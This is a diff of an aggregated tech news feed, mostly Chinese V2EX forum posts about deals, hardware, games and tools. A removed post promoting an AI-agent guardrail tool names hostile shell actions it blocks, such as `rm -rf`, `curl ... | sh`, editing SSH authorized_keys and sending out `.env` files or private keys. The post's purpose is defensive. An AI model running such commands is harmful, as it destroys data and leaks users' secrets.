+	&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/392a0caa0139b665f840acd28fefeaa5fdb535f55015fa6d0634d7b6ddbec8e0.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/392a0caa0139b665f840acd28fefeaa5fdb535f55015fa6d0634d7b6ddbec8e0.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/7fc2f00c577f96c71ad02a76026ee73af2a1272f513b1402b91d0905fd5b59e5.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/7fc2f00c577f96c71ad02a76026ee73af2a1272f513b1402b91d0905fd5b59e5.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/ca9191c2b79f7efce9fc183ef6e1fa28d646d108850419af3e0afe338dec6817.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/ca9191c2b79f7efce9fc183ef6e1fa28d646d108850419af3e0afe338dec6817.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/21ef15c77815903bd1e54c207b97b4c9fb48064f47acc8a08e887911dcd2a2e4.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/21ef15c77815903bd1e54c207b97b4c9fb48064f47acc8a08e887911dcd2a2e4.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:2b4a6c0c-11a6-5255-97cc-e27d914ded5c</id>
     <title>[Amazon] 亚马逊黑五苹果礼品卡优惠码：APPLEBF2026</title>
     <updated>2026-11-27T17:57:06.000Z</updated>
     <author>
       <name>GoogolChrome111</name>
     </author>
     <published>2026-11-27T17:57:06.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260480#reply0"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260480#reply1"/>
     <category term="IT 科技"/>
     <content type="html">
 	
@@ -64,14 +825,14 @@
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:296e70e0-77ef-5641-891d-7d4c0b322479</id>
+    <id>urn:uuid:255c627d-8772-5a15-b18a-a3ff075b1315</id>
     <title>[Windows] BIOS 能看到 U.2 固态，但 Windows11 下看不到</title>
     <updated>2026-11-27T17:51:07.000Z</updated>
     <author>
       <name>rangerwill</name>
     </author>
     <published>2026-11-27T17:51:07.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260479#reply0"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260479#reply5"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;硬件环境：&lt;br /&gt;
@@ -101,14 +862,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:0da6f321-8d74-53c5-82f4-71c02689e0df</id>
+    <id>urn:uuid:708afbf4-96b3-59dc-893b-032d56eaa31a</id>
     <title>[推广] Scribble Royale：在纸上玩大逃杀，负责缩圈的是一块橡皮擦</title>
     <updated>2026-11-27T17:48:30.000Z</updated>
     <author>
       <name>919936091</name>
     </author>
     <published>2026-11-27T17:48:30.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260478#reply0"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260478#reply1"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;分享一个可以在浏览器里玩的多人小游戏 Scribble Royale，作者是 Perpel。整张地图画在一张纸上，粉色线是安全区的边缘。缩圈时，一块大橡皮会沿着边界把地图一点点擦掉，人留在线外也会掉血。&lt;/p&gt;
@@ -140,14 +901,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:5007407b-2305-5a13-a294-3ad8d5fd936d</id>
+    <id>urn:uuid:30630f1a-88d4-5490-8494-d55e866742d4</id>
     <title>[推广] 智友社回馈 V 站新老客户，抽送第 15 波 5 个 智友社的 GPTPLUS 稳定特殊渠道日区独享月卡成品号 3（稳定度 98%）</title>
     <updated>2026-11-27T17:19:02.000Z</updated>
     <author>
       <name>Ai2You</name>
     </author>
     <published>2026-11-27T17:19:02.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260477#reply1"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260477#reply2"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;各位 V 友好，感谢大家一直以来对我们智友社的支持和关注。&lt;/p&gt;
@@ -390,14 +1151,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:f7b149ec-005d-5451-a59d-4ceb9c05a90f</id>
-    <title>[问与答] 社交圈太小，怎么才能认识更多异性？</title>
+    <id>urn:uuid:f3ecdcdc-964b-5922-9924-982019e9f134</id>
+    <title>[生活] 社交圈太小，怎么才能认识更多异性？</title>
     <updated>2026-11-27T15:59:45.000Z</updated>
     <author>
       <name>bofei</name>
     </author>
     <published>2026-11-27T15:59:45.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260472#reply5"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260472#reply14"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;本人是个 i 人，有焦虑症躯体化的问题，目前有在吃药。性格比较内向，也不太擅长主动社交。&lt;/p&gt;
@@ -446,35 +1207,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:844c18ac-3bfa-5f78-a352-3f732d192935</id>
-    <title>[程序员] 咕咕嘎嘎 这么牛的公司，不至于玩不起吧</title>
-    <updated>2026-11-27T15:44:41.000Z</updated>
-    <author>
-      <name>FunyimsGo</name>
-    </author>
-    <published>2026-11-27T15:44:41.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260468#reply1"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;咋还删帖呢？&lt;br /&gt;
-（我还没上车呢）&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:f63497da-fe8b-5833-ab4f-08954647797a</id>
+    <id>urn:uuid:d2f349ff-a2fa-5ef2-8bc0-e2c62f6ef396</id>
     <title>[Android] 大家的桌面是用系统自带的？还是用自定义的？</title>
     <updated>2026-11-27T15:44:32.000Z</updated>
     <author>
       <name>xueshi</name>
     </author>
     <published>2026-11-27T15:44:32.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260467#reply6"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260467#reply8"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;RT&lt;br /&gt;
@@ -489,14 +1229,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:7672d997-6087-5f6c-b9a5-6d959c9f928a</id>
+    <id>urn:uuid:1846a226-f9ac-5d55-b762-6ef3f0472a20</id>
     <title>[Google Gemini] gemini 新帐号一直看不到半价，咋整啊</title>
     <updated>2026-11-27T15:41:56.000Z</updated>
     <author>
       <name>miaomiao2015</name>
     </author>
     <published>2026-11-27T15:41:56.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260466#reply3"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260466#reply5"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;gemini 新帐号一直看不到半价，买了一个 GV 老号也不行，搞了一晚上了，还是 199.99 咋整啊&lt;br /&gt;
@@ -510,14 +1250,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:a11e9ed5-f048-568c-b02e-6a47a28a59ba</id>
+    <id>urn:uuid:631c0ac9-1d33-5d4d-a02a-8c7ccc764fb0</id>
     <title>[推广] [推广] [发码] 做了个 AI 阅读器 ，我们想将 AI 和阅读器做深度结合，而不仅仅是简单问答</title>
     <updated>2026-11-27T15:36:37.000Z</updated>
     <author>
       <name>FukArtorias</name>
     </author>
     <published>2026-11-27T15:36:37.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260464#reply10"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260464#reply17"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;下面是我们已经做的 AI 功能，采用 BYOK 形式。&lt;/p&gt;
@@ -854,14 +1594,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:07b51423-05f6-570a-bd65-52eb4309146a</id>
+    <id>urn:uuid:4a7a0255-536c-5dc4-a3c7-e353f672b010</id>
     <title>[程序员] 觉得 vibe coding 半天还不如直接花钱订阅成熟的软件</title>
     <updated>2026-11-27T14:56:22.000Z</updated>
     <author>
       <name>desususula</name>
     </author>
     <published>2026-11-27T14:56:22.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260459#reply11"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260459#reply17"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;就算开发者也在用 ai，不就相当于用户花一份钱买了未来一年作者的 token 用量么，比个人看 agent 吭哧吭哧跑既省钱又省时间&lt;/p&gt;
@@ -1040,14 +1780,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:56470ee5-0eb4-5a1e-a097-82970967f1d3</id>
+    <id>urn:uuid:bb8a891a-bade-5c4c-9156-46969fb25cd0</id>
     <title>[Claude] 进来说说哪些任务是你非交给 Claude 不可的</title>
     <updated>2026-11-27T13:58:15.000Z</updated>
     <author>
       <name>chirsxp</name>
     </author>
     <published>2026-11-27T13:58:15.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260453#reply0"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260453#reply1"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;很多人不理解为啥 Claude 封号这么严重还要继续使用&lt;/p&gt;
@@ -1353,14 +2093,14 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:a2abc63a-0711-5fd1-ac78-e132b5d39d0e</id>
+    <id>urn:uuid:f6bcc7a1-4b43-5a57-bb3a-c421fbef848d</id>
     <title>[杭州] 求杭州户外徒步野线推荐</title>
     <updated>2026-11-27T13:15:10.000Z</updated>
     <author>
       <name>milksofter</name>
     </author>
     <published>2026-11-27T13:15:10.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260444#reply1"/>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260444#reply2"/>
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;西湖群山徒步路线，网上能搜到的知名路线，人都特别多，想找个人少的路线。&lt;/p&gt;
@@ -1393,50 +2133,6 @@ CPU： Intel 13400&lt;br /&gt;
     <category term="IT 科技"/>
     <content type="html">
 	&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/1ad0ed8938118378b4f34bc71ac660589723919635122af6cdb0a5be73d462e5.png" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/1ad0ed8938118378b4f34bc71ac660589723919635122af6cdb0a5be73d462e5.png" /&gt;&lt;/a&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:8e305a5a-dc8f-539d-ba52-09aaf0c7da96</id>
-    <title>[推广] 轻量级、高性能、无侵入的 开源 Antigravity 中文 汉化工具来了！</title>
-    <updated>2026-11-27T13:04:07.000Z</updated>
-    <author>
-      <name>toubi</name>
-    </author>
-    <published>2026-11-27T13:04:07.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260442#reply1"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;就是一个&lt;br /&gt;
-轻量级、高性能、无侵入式的 Google Antigravity 2.0 桌面端（Windows / macOS） 简体中文汉化启动器。&lt;/p&gt;
-&lt;p&gt;精简，没有花里胡哨的东西，并且非常克制的只做了界面翻译，MCP 和插件也制作了描述翻译。可以来试一试&lt;/p&gt;
-&lt;p&gt;开源地址：&lt;a href="https://github.com/keinx/AntigravityZH"&gt;https://github.com/keinx/AntigravityZH&lt;/a&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:b303ccb4-6d46-587c-8ef8-5521131809d7</id>
-    <title>[iPhone] iPhone 通过 chomecast 投屏到安卓电视，最划算的 app 是什么？</title>
-    <updated>2026-11-27T13:02:37.000Z</updated>
-    <author>
-      <name>shenzhenhk</name>
-    </author>
-    <published>2026-11-27T13:02:37.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260441#reply2"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;iOS 内置只有 AirPlay，需要安装 app 才能增加 chromecast，但是看了几个 app 都要内购。&lt;/p&gt;
-&lt;p&gt;问问大家使用经验，免费的或者买断制 app 都行，谢谢&lt;/p&gt;
 
 	</content>
     <source>
@@ -1491,82 +2187,6 @@ CPU： Intel 13400&lt;br /&gt;
       <title>动点科技</title>
       <link rel="self" href="https://cn.technode.com/feed"/>
       <link rel="alternate" href="https://cn.technode.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:d14276de-3022-5863-b7a0-85c8688cd04f</id>
-    <title>[信息安全] 开源 Agent Audit：给 AI Coding Agent 装一层本地安全护栏（Shell AST 拦截 + 低误报敏感内容检测）</title>
-    <updated>2026-11-27T12:32:08.000Z</updated>
-    <author>
-      <name>chochox</name>
-    </author>
-    <published>2026-11-27T12:32:08.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260440#reply0"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;现在日常工作流越来越重度依赖 Claude Code、OpenCode、Pi 和各种 MCP / Skill，用久了发现有几类风险离自己很近，不是危言耸听：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Obsidian 笔记里的敏感密钥被带出去&lt;/strong&gt;：很多人习惯在 Obsidian 里记服务器地址、API Key、SSH/数据库配置。让 Agent 帮你搜笔记、整理资料时，一个 &lt;code&gt;grep&lt;/code&gt; / &lt;code&gt;read&lt;/code&gt; 就可能把整篇含真实凭据的笔记喂进模型上下文。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;用 Himalaya 查邮件时泄露个人隐私&lt;/strong&gt;：给 Agent 接了 &lt;code&gt;himalaya&lt;/code&gt;&lt;br /&gt;
-读邮箱、总结账单或日程，结果邮件里的身份证号、银行卡/账单明细、体检医疗信息、甚至登录验证码，全随着工具输出裸奔进对话里。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;高危 Shell / 文件误操作&lt;/strong&gt;：Agent 排障或写脚本时一时兴起，来一句破坏性 &lt;code&gt;rm -rf&lt;/code&gt;、&lt;code&gt;curl ... | sh&lt;/code&gt;、修改 &lt;code&gt;.git/hooks&lt;/code&gt; / &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt;，或者把 &lt;code&gt;.env&lt;/code&gt; / 私钥往外发。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;之前自己踩过坑也一直提心吊胆，于是把自用的风控审计工具整理开源了：&lt;strong&gt;Agent Audit&lt;/strong&gt;。 之前自己主要工作方向就是风控，对这块也比较感兴趣，希望交流下大家的真实想法。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;GitHub（Apache-2.0）&lt;/strong&gt;：&lt;a href="https://github.com/smileboywtu/agent-audit"&gt;https://github.com/smileboywtu/agent-audit&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;在线防误报 Playground &amp;amp; 免费 API Key&lt;/strong&gt;：&lt;a href="https://www.zhisoft.top/agent-audit"&gt;https://www.zhisoft.top/agent-audit&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr /&gt;
-&lt;h3&gt;核心能力&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;1. 本地单二进制风控引擎（Go + 内置 SQLite + 双语 WebUI）&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Shell AST 实时拦截（&amp;lt; 1ms）&lt;/strong&gt;：直接解析命令语法树，内置 5 大类 23 条确定性高危规则，不靠大模型猜。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;灵活策略体系&lt;/strong&gt;：支持 &lt;code&gt;off / shadow / enforce&lt;/code&gt; 三种模式，覆盖工具/文件操作/内容/模型的黑白名单，以及沙盒化的 CEL 表达式规则（比如专门禁止读取 Obsidian 某个私密目录或 &lt;code&gt;.env&lt;/code&gt;）。   &lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;人工单次放行&lt;/strong&gt;：误拦时人在本机 CLI 或 WebUI 点一下即可临时放行；&lt;strong&gt;刻意不暴露给 MCP&lt;/strong&gt;，防止 Agent 自己批准自己。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;多端覆盖&lt;/strong&gt;：原生支持 Claude Code Hook、通用 stdio MCP Proxy（Cursor / Windsurf / Claude Desktop 等都能套）、OpenCode / Pi 插件；自带本地 MCP 管理接口，可以直接让 AI&lt;br /&gt;
-帮你查审计日志或写规则。                                                                                                                                                              &lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;2. 低误报语义敏感内容检测（免登录可试）&lt;/strong&gt;&lt;br /&gt;
-扫文本最头疼的其实是误报——传统正则看到 &lt;code&gt;.env.example&lt;/code&gt; 占位符、Git SHA、lockfile 哈希、单元测试假 token 就疯狂报警，用两天就想关掉。&lt;/p&gt;
-&lt;p&gt;我把自研的 307M 双头语义模型接了个免费云端入口，目前重点覆盖 &lt;strong&gt;4 类敏感信息&lt;/strong&gt; 的语义识别（并带角色复核降误报）：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;凭据 / 密钥（&lt;code&gt;credentials&lt;/code&gt;）&lt;/strong&gt;：API Key、AccessKey、私钥、数据库连接串/密码、Token 等&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;身份与证件信息（&lt;code&gt;identity_documents&lt;/code&gt;）&lt;/strong&gt;：身份证号、护照/证件号等个人身份标识&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;金融与支付敏感（&lt;code&gt;private_financial&lt;/code&gt;）&lt;/strong&gt;：银行卡号、账户及财务账单明细等&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;个人健康与医疗隐私（&lt;code&gt;private_health&lt;/code&gt;）&lt;/strong&gt;：体检报告、病历诊断等医疗健康信息&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;免登录 Playground&lt;/strong&gt;：&lt;a href="https://www.zhisoft.top/agent-audit"&gt;https://www.zhisoft.top/agent-audit&lt;/a&gt; ，内置了真实密钥/生产 DSN vs 占位符/哈希/测试夹具的对比样例，可以直接试效果。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;免费 Cloud API&lt;/strong&gt;：注册即可领 Key，每账号默认 &lt;strong&gt;500 次/天&lt;/strong&gt;，&lt;strong&gt;Zero Data Retention&lt;/strong&gt;（纯内存推理，不落盘、不写日志）。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;模式与路线&lt;/strong&gt;：当前已支持&lt;strong&gt;同步实时拦截&lt;/strong&gt;（也可选仅记录不拦截的 &lt;code&gt;shadow&lt;/code&gt; 模式）；&lt;strong&gt;后续计划支持敏感信息掩码模式&lt;/strong&gt;，自动脱敏打码后再放行给模型，兼顾安全与任务连续性。&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr /&gt;
-&lt;h3&gt;一点说明&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;线上云端检测和线下开源版本对个人用户完全免费&lt;/strong&gt;，要求使用 API Key 并设置默认 500 次/天纯粹是为了防止被恶意刷爆滥用；&lt;/li&gt;
-&lt;li&gt;目前云端免费 API 跑在自己的机器上，&lt;strong&gt;推理速度还比较慢&lt;/strong&gt;，多多包涵；&lt;/li&gt;
-&lt;li&gt;如果有 V 友想深度体验、每天 500 次不够用，可以直接&lt;strong&gt;免费联系我申请更高的每日额度&lt;/strong&gt;。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;具体接入方式和规则边界仓库里都写得很清楚（&lt;code&gt;&lt;a href="http://readme.zh-cn.md/"&gt;README.zh-CN.md&lt;/a&gt;&lt;/code&gt; / &lt;code&gt;&lt;a href="http://rules.zh-cn.md/"&gt;RULES.zh-CN.md&lt;/a&gt;&lt;/code&gt;），欢迎各位 V 友去 Playground&lt;br /&gt;
-拿各种真实或奇葩样例测一测，大家有什么想法、场景需求或建议也欢迎直接提一下！&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
     </source>
   </entry>
   <entry>
@@ -1666,84 +2286,6 @@ CPU： Intel 13400&lt;br /&gt;
       <title>爱范儿</title>
       <link rel="self" href="https://www.ifanr.com/feed"/>
       <link rel="alternate" href="https://www.ifanr.com?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:37fc487b-8b7b-51fd-b1f0-cad5d5bf8713</id>
-    <title>[游戏] 球迷看过来 - 赢嗨了魔改足球经理</title>
-    <updated>2026-11-27T12:16:17.000Z</updated>
-    <author>
-      <name>fangzhanbo</name>
-    </author>
-    <published>2026-11-27T12:16:17.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260438#reply1"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;曼联英超第 19 了。&lt;br /&gt;
-现实救不了，只能靠魔改了，不靠索嗨 卡嗨 滕嗨——打开「赢嗨了魔改足球经理」，换人重算一场，周末未赛的也可以先锁预测。&lt;/p&gt;
-&lt;p&gt;搜微信小游戏：赢嗨了魔改足球经理&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:f3e75f7f-07e7-55e7-bab1-9dec641e999c</id>
-    <title>[推广] [推广] 学生发来课件截图，我花了半小时才改好</title>
-    <updated>2026-11-27T12:14:32.000Z</updated>
-    <author>
-      <name>weishao666</name>
-    </author>
-    <published>2026-11-27T12:14:32.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260437#reply0"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;上周有个大二的学生发消息给我，说小组作业要做课堂展示，老师给的课件是直接截图发在群里的，一共十一张，有的是从 PPT 画面截的，有的是拿手机拍屏幕拍的，边上还带着桌角和反光。她想把这些图弄成一版自己能改的 PPT，主要是把老师写的旧年份、旧数据换掉，再补上自己小组的内容。&lt;/p&gt;
-&lt;p&gt;我的做法是先按页拆开，把拍糊的斜边和反光裁掉，再让工具把每页认成文本框和形状。十一页弄完大概二十来分钟，比我预想的快，因为课件排版还算规矩，标题一行、正文几行，认出来的位置基本对得上。学生自己要改的那几处数据，改起来也就是点进去替换。&lt;/p&gt;
-&lt;p&gt;有两页必须我手工收尾。一页是老师用红笔在图上圈了一段话做批注，工具把那圈红线和文字一起当成正文了，认出来一堆乱码；另一页是个流程图，框和箭头的位置全错，连线的上下级关系也乱了。这两页我没硬修，直接在空白页上重画，图重新摆，文字从识别结果里挑着粘过去，一页大概七八分钟。&lt;/p&gt;
-&lt;p&gt;所以它能做到的，是把图里的字变成能改的字；位置、层级、批注这些还得自己看一眼，图越多的页越明显。我也想问问同样在做小组作业的同学，你们拿到老师发的截图课件，是一页一页照着打字，还是有别的更省事的做法？&lt;/p&gt;
-&lt;p&gt;工具入口在这里：&lt;a href="https://image2ppt.asia/?utm_source=v2ex"&gt;https://image2ppt.asia?utm_source=v2ex&lt;/a&gt;&lt;br /&gt;
-（图片、截图、单页 PDF 都能转成可编辑的 PPTX，成品无水印。）&lt;/p&gt;
-&lt;p&gt;一个例子（原图 → 可编辑成品）：&lt;/p&gt;
-&lt;p&gt;&lt;img alt="项目章程 PPT 模板 原图" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/2125c8e5dee61bc1a0c17ae3d777a77cd228065c917589f866716f6371bc934c.jpg" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt="项目章程 PPT 模板 成品" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/125ace4fa44817d6307e810d665d8ded98498bcba432dbcb614d11132b98ec98.jpg" /&gt;&lt;/p&gt;
-&lt;p&gt;素材库里随手挑的几页，这类图都能这么转：&lt;/p&gt;
-&lt;p&gt;&lt;img alt="32_科技风阶段流程结构生物科研背景 PPT" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/5d063aba65d6b727b5c6e6acb8ecddd57b994736a06a0595606f6cc8c80b7401.jpg" /&gt;&lt;br /&gt;
-&lt;img alt="83_开题报告结构模板 01" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/fab9895fb6ad35cb9da3eab9bb286dfd0598b9c46fcd37ea0e8f1b5b9998d88c.jpg" /&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:ddf299af-417f-5ed9-8492-2e563cc0c066</id>
-    <title>[分享创造] 写了个《賓果小瑪莉麻仔台 - 經典水果老虎機》</title>
-    <updated>2026-11-27T12:13:49.000Z</updated>
-    <author>
-      <name>kiwif</name>
-    </author>
-    <published>2026-11-27T12:13:49.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260436#reply0"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;h1&gt;写了个《賓果小瑪莉麻仔台 - 經典水果老虎機》&lt;/h1&gt;
-&lt;p&gt;大伙捧个场&lt;br /&gt;
-&lt;a href="https://play.google.com/store/apps/details?id=com.bingomali"&gt;下载地址&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.bingomali"&gt;&lt;img alt="视频" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/ba18ed2448ef69275bd6375f43ddf118451ef6886f02068146ffadd965ef72cd.webp" /&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.bingomali"&gt;下载地址&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;[&lt;img alt="视频" loading="lazy" src="https://www.youtube.com/watch?v=SI4MEmCUHiE" /&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
     </source>
   </entry>
   <entry>
@@ -1858,35 +2400,6 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:ac7c5e2c-79cd-57e2-bcae-bc3383414503</id>
-    <title>[iPhone] 紫毫又更了，双拼加了自然码，语音可以直接在键盘里说</title>
-    <updated>2026-11-27T12:11:06.000Z</updated>
-    <author>
-      <name>blycoris</name>
-    </author>
-    <published>2026-11-27T12:11:06.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260435#reply2"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;之前在站里发过紫毫 (&lt;a href="https://www.v2ex.com/t/1249450"&gt;https://www.v2ex.com/t/1249450&lt;/a&gt;) 。一开始做它，是因为电脑上用惯了鼠须管和雾凇拼音，想把自己的词库和短语带到 iPhone 上。正式版现在到了 2.6.0，这次想聊几个打字时真能碰到的改动。&lt;/p&gt;
-&lt;p&gt;先说语音。有时候就想回一句「我今天下午三点到」，按住空格说完，松手就上屏。说到「百分之五十」也可以直接写成 50%。2.6.0 里，在线语音和 iOS 26 的 Apple 端侧识别在支持的设备上可以直接在键盘内录音。语音是 Pro 功能。&lt;/p&gt;
-&lt;p&gt;紫毫语音输入界面，长按空格听写&lt;/p&gt;
